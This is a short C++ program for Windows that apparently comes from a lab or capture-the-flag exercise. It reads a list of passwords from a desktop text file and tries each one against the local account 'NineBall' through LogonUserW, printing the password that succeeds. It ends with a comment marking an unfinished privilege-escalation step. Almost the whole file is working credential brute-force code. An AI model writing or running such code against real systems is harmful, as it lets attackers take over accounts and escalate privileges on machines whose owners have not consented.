#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>

int wmain() {

	// read passwords in doc
	std::wifstream file;
	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
	std::vector<std::wstring> passList;
	std::wstring pass;

	if (file.is_open()) {
		std::wstring s;
		while (std::getline(file, s)) {
			passList.push_back(s.substr(s.find(L":") + 2));
		}
	}
	file.close();

	// attempt to authenticate as NineBall with passwords
	HANDLE hToken;
	for(std::wstring s : passList) {
		std::wcout << L"\"" << s << L"\"" << std::endl;
		if (LogonUserW(
			L"NineBall",
			L".",
			s.c_str(),
			LOGON32_LOGON_NETWORK,
			LOGON32_PROVIDER_DEFAULT,
			&hToken
		)) {
			pass = s;
			break;
		}
	}

	std::wcout << L"pass: \"" << pass << L"\"" << std::endl;

	// create privesc process as NineBall
}